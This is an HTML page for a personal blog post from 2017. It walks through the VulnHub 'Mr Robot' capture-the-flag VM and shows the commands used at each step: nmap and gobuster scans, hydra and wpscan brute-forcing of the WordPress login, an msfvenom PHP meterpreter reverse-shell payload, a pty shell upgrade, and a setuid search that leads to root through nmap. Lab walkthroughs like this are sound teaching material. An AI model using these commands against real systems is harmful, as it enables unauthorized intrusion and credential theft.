@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta itemprop="name" content="CTF - Mr Robot">
+  <title>CTF - Mr Robot</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta itemprop="description" content="This is my personal blog to keep track of stuff I am doing after hours.">
+
+  
+  <meta itemprop="keywords" content="" />
+  
+    <meta itemprop="wordCount" content="609">
+  
+
+  <meta property="og:title" content="CTF - Mr Robot" />
+  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="http://camelinc.info/blog/2017/02/CTF---Mr-Robot/" />
+  
+
+  
+  <meta property="og:updated_time" content="2017-02-25 10:46:59 &#43;0000 UTC"/>
+  
+  
+  
+  
+
+  
+    <meta name="twitter:card" content="summary"/>
+  
+
+  
+  <meta name="twitter:title" content="CTF - Mr Robot"/>
+  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
+  
+  
+
+
+  <meta name="generator" content="Hugo 0.18.1" />
+  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
+  <link href="http://camelinc.info/css/bootstrap.min.css" rel="stylesheet">
+  <link href="http://camelinc.info/css/hc.css" rel="stylesheet">
+
+  
+  <link rel="stylesheet" href="http://camelinc.info/css/zenburn.css" type="text/css" media="screen" />
+
+  
+
+  
+  <link rel="stylesheet" href="http://camelinc.info/lightbox/css/lightbox.css" type="text/css" media="screen">
+
+
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+  
+  
+</head>
+ 
+
+
+<body>
+
+<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
+  <div id = "wrapper">
+
+<div class="navbar navbar-default" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
+        </div>
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+					
+					
+					<li><a href="http://camelinc.info/about">About </a></li>
+					
+					<li><a href="http://camelinc.info/post">Posts </a></li>
+					
+          </ul>
+        </div>
+      </div>
+    </div>
+
+
+
+       
+       <div id="sidebar-wrapper">
+        <ul class="sidebar-nav">
+					<img src="/img/avatar.png" />
+          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
+          <hr />
+
+					
+						<li><a href="http://camelinc.info/about">About </a></li>
+					
+						<li><a href="http://camelinc.info/post">Posts </a></li>
+					
+          <hr />
+
+          <div id="social-wrapper">
+           
+             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
+           
+
+           
+             
+           
+
+           
+             
+           
+
+           
+             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
+           
+         </div>
+
+       </ul>
+     </div>
+
+     <div class="container">
+
+
+  <div id="article">
+    <div class="article-title">CTF - Mr Robot</div>
+    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2017-02-25</small></p> <hr/>
+    <div class="post">
+      
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Find the three flags that are hidden in the vm.</p>
+
+<h2 id="information-gathering">Information gathering</h2>
+
+<p>To begin the fun let&rsquo;s run netdiscover to identify the target system.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/netdiscover-1_0.png" data-lightbox="default" data-title="Identify the right target" >
+        <img src="/img/post/2017/vulnhub-mr-robot/netdiscover-1_0.png" alt="Identify the right target" >
+    </a>
+</figure>
+
+
+
+<p>There it is, waiting at 10.0.2.7.
+The next step obviously is to run a quick nmap scan.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>nmap -sS -p- <span class="m">10</span>.0.2.7 -v --open -oA target_<span class="k">$(</span>date <span class="s2">&quot;+%Y-%m-%d&quot;</span><span class="k">)</span> -sC -sV
+</code></pre></div>
+
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/nmap-1_0.png" data-lightbox="default" data-title="Nmap scan results." >
+        <img src="/img/post/2017/vulnhub-mr-robot/nmap-1_0.png" alt="Nmap scan results." >
+    </a>
+</figure>
+
+
+
+<p>Run a file brute-force on the webserver.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>gobuster -u http://10.0.2.7 -w /usr/share/seclists/Discovery/Web_Content/raft-medium-files.txt -e -r -l
+</code></pre></div>
+
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/gobuster-1_0.png" data-lightbox="default" data-title="The results of the directory brute-force attack." >
+        <img src="/img/post/2017/vulnhub-mr-robot/gobuster-1_0.png" alt="The results of the directory brute-force attack." >
+    </a>
+</figure>
+
+
+
+<p>While gobuster is running and the results are coming in, let&rsquo;s just take a look at the website and the robots.txt.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre></div>
+
+
+<p>Voila, there is the first key.</p>
+
+
+
+<figure class="fcenter fsmall">
+    <a href="/img/post/2017/vulnhub-mr-robot/flag-1_1.png" data-lightbox="default" data-title="Flag 1" >
+        <img src="/img/post/2017/vulnhub-mr-robot/flag-1_1.png" alt="Flag 1" >
+    </a>
+</figure>
+
+
+
+<h2 id="flag-2">Flag 2</h2>
+
+<p>Next, we run wpscan examine the wordpress installation.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>wpscan --enumerate --threads <span class="m">20</span> --batch --log --url http://10.0.2.7
+</code></pre></div>
+
+
+<p>Unfortunately, wpscan did not yield any obvious pointers to exploit the wordpress installation.
+Furthermore, the tool was not able enumerate any users that might have a valid login.</p>
+
+<p>Let&rsquo;s take another look at the discoveries so far.
+The fsocity.dic file might provide some pointers or provide input for a brute-force attack.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="c1"># wc -l fsocity.dic</span>
+<span class="m">858160</span> fsocity.dic
+<span class="c1"># sort -u fsocity.dic | wc -l</span>
+<span class="m">11451</span>
+</code></pre></div>
+
+
+<p>Refreshing my knowledge about wordpress, the problem with username disclosure at the login seemed to provide a starting point.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/wp-login-1_1.png" data-lightbox="default" data-title="User enumeration vulnerability." >
+        <img src="/img/post/2017/vulnhub-mr-robot/wp-login-1_1.png" alt="User enumeration vulnerability." >
+    </a>
+</figure>
+
+
+
+<p>With the fsocity.dic and hydra we might be able to brute-force a valid login name.
+To do this, we simply set the password to some bogus value and adjust the pattern for an invalid login to &ldquo;Invalid username&rdquo;.</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>hydra -L fsocity_sorted.dic -p <span class="nb">test</span> <span class="m">10</span>.0.2.7 http-post-form <span class="s2">&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.0.2.7%2Fwp-admin%2F&amp;testcookie=1:Invalid username&quot;</span> -t <span class="m">50</span> -f -V
+</code></pre></div>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/hydra-1_0.png" data-lightbox="default" data-title="Valid login names." >
+        <img src="/img/post/2017/vulnhub-mr-robot/hydra-1_0.png" alt="Valid login names." >
+    </a>
+</figure>
+
+</p>
+
+<p>Awesome, and quite obvious that this is the username!
+With a valid login name the next step is to brute-force the password for the user &ldquo;elliot&rdquo;.
+Let&rsquo;s switch back to wpscan for this task.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>wpscan --log --batch --url <span class="m">10</span>.0.2.7 --wordlist <span class="si">${</span><span class="nv">PWD</span><span class="si">}</span>/fsocity_sorted.dic --username elliot --threads <span class="m">20</span>
+</code></pre></div>
+
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/wpscan-1_1.png" data-lightbox="default" data-title="Valid login account found!" >
+        <img src="/img/post/2017/vulnhub-mr-robot/wpscan-1_1.png" alt="Valid login account found!" >
+    </a>
+</figure>
+
+
+
+<p>The login credentials give us administrative access to the wordpress installation.
+So, the next step is to gain a shell on the underlying server.
+This can easily be done by adding our own php code to one of the templates.</p>
+
+<p>First, let&rsquo;s create a metasploit payload that connects back to us.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.2.8 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f raw -o meterpreter.php
+</code></pre></div>
+
+
+<p>Take a look at the home directories.
+There is a user robot with the second flag file.
+Unfortunately, we do not have the right access rights, but in the same folder is a password hash for the user that we might be able to crack.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/meterpreter-1_1.png" data-lightbox="default" data-title="The meterpreter reverse shell has connected and we have access to the system" >
+        <img src="/img/post/2017/vulnhub-mr-robot/meterpreter-1_1.png" alt="The meterpreter reverse shell has connected and we have access to the system" >
+    </a>
+</figure>
+
+
+
+<p>A quick search on google yields the result for the MD5 hash.</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text"><span></span>MD5(abcdefghijklmnopqrstuvwxyz) = c3fcd3d76192e4007dfb496cca67e13b
+</code></pre></div>
+
+
+<p>To get a proper shell, let&rsquo;s switch back to the meterpreter session and open a shell.
+An interactive version can be started via the following command.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</code></pre></div>
+
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/flag-1_2.png" data-lightbox="default" data-title="We have access to the second file!" >
+        <img src="/img/post/2017/vulnhub-mr-robot/flag-1_2.png" alt="We have access to the second file!" >
+    </a>
+</figure>
+
+
+
+<h2 id="flag-3">Flag 3</h2>
+
+<p>After searching the server only the root user&rsquo;s home directory is left.
+To access this folder we somehow need to gain root on the system.
+The kernel is fairly old and might be vulnerable to an exploit.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/meterpreter-1_0.png" data-lightbox="default" data-title="An old kernel version!" >
+        <img src="/img/post/2017/vulnhub-mr-robot/meterpreter-1_0.png" alt="An old kernel version!" >
+    </a>
+</figure>
+
+
+
+<p>Searchsploit ftw.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/searchsploit-1_0.png" data-lightbox="default" data-title="One vulnerability found for the kernel!" >
+        <img src="/img/post/2017/vulnhub-mr-robot/searchsploit-1_0.png" alt="One vulnerability found for the kernel!" >
+    </a>
+</figure>
+
+
+
+<p>Also, the exploit suggester might provide additional pointers.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/searchsploit-1_1.png" data-lightbox="default" data-title="There exists another vulnerability with a metasploit module." >
+        <img src="/img/post/2017/vulnhub-mr-robot/searchsploit-1_1.png" alt="There exists another vulnerability with a metasploit module." >
+    </a>
+</figure>
+
+
+
+<p>Both exploits do not work on the target system.
+The suggested kernel exploit overlayfs_priv_esc is applicable to the kernel according to the exploit module.
+The netfilter_priv_esc_ipv4 is not compatible with the old linux version.</p>
+
+<p>So there has to be some way to gain root on the server.
+Let&rsquo;s search for setuid files that might be exploitable.</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>find / -perm +6000 <span class="m">2</span>&gt; /dev/null
+</code></pre></div>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/searchsploit-1_2.png" data-lightbox="default" data-title="A local installation of nmap." >
+        <img src="/img/post/2017/vulnhub-mr-robot/searchsploit-1_2.png" alt="A local installation of nmap." >
+    </a>
+</figure>
+
+</p>
+
+<p>There is nmap installed on the system and the version 3.81 is pretty old.
+In these old days, there was an interactive shell that could be utilized to gain root on the system.
+Seems like we have a winner!
+This version of nmap has that option enabled.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2017/vulnhub-mr-robot/flag-1_3.png" data-lightbox="default" data-title="The third and final flog." >
+        <img src="/img/post/2017/vulnhub-mr-robot/flag-1_3.png" alt="The third and final flog." >
+    </a>
+</figure>
+
+
+
+<h1 id="links">Links</h1>
+
+<ul>
+<li><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Mr-Robot: 1</a></li>
+</ul>
+
+    </div>
+  </div>
+
+  <ul class="pager">
+    
+
+    
+    
+      
+        &nbsp;<li class="next"><a href="http://camelinc.info/blog/2016/09/Social-Engineering-with-PowerShell-Empire-and-gophish/"> Social Engineering with PowerShell Empire and gophish</a></li>
+      
+    
+  </ul>
+
+
+
+<footer>
+
+  <p class="text-muted credit">&copy; . All rights reserved. </p>
+    </footer>
+
+  
+  
+
+  <script type="text/javascript" src="/js/jquery-2.1.4.js"></script>
+
+  <script src="/js/bootstrap.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+  <script type="text/javascript" src="/js/hc.js"></script>
+
+  
+  <script type="text/javascript" src="/lightbox/js/lightbox.js"></script>
+
+  
+
+</footer>
+
+
+	</body>
+</html>
